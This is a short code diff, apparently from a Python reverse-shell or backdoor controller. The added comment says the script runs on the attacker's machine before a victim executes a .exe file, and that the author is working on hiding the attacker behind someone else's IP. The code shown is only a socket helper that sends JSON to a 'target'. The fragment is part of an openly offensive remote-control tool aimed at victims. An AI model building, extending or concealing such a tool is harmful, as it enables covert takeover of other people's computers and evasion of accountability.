@@ -3,7 +3,13 @@ import os
 import socket
 import json
 
+'''
 
+--This should be run on the attackers machine before the victim executes the .exe file
+--The script crashes if I didn't put my IP, so make sure to input your own IP...I'm working to make it work with someone else's IP,
+just to make it seem like the attacker is somehow hidden.
+
+'''
 def reliable_send(data):
     jsondata = json.dumps(data)
     target.send(jsondata.encode())
